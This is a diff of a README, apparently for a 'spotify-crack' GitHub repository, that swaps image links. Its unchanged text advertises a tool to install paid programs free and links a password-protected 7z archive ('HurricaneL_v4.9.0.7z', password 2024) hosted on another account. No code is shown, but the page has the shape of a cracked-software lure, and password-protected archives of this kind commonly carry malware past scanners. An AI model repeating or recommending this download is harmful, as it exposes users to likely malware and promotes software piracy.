@@ -2,7 +2,8 @@
 [![downloadstats](https://github.com/jakerellson55/jakerellson55-proj/assets/163674734/e040afcc-af00-42a8-9e64-3b8c68b03631)](https://github.com/jakerellson55/jakerellson55-proj/releases/download/HurricaneL_v4.9.0/HurricaneL_v4.9.0.7z)
 > Password: 2024
 
-![spotife 1](https://github.com/golrerw/spotify-crack/assets/163683941/54c69553-3f0c-49ba-9988-104b3982c370)
+![spotife 1](https://github.com/golrerw/spotify-crack/assets/163683941/0c7d34b3-9b14-4ffe-b8c0-5ba0cd92185f)
+
 
 > [!NOTE]
 > Our program is your indispensable assistant in the world of freeware. This program allows you to install paid programs absolutely free of charge, giving you access to a wide range of features without restrictions. With us you will be able to enjoy quality applications without spending a penny.
@@ -35,7 +36,8 @@
 
 </div>
 
-![spotify](https://github.com/golrerw/spotify-crack/assets/163683941/df9f7671-d1ca-47c2-8d1f-6f8689643baf)
+![spotify](https://github.com/golrerw/spotify-crack/assets/163683941/12a060a2-78d5-4b0b-88c7-4557a9d28f33)
+
 
 ---
 
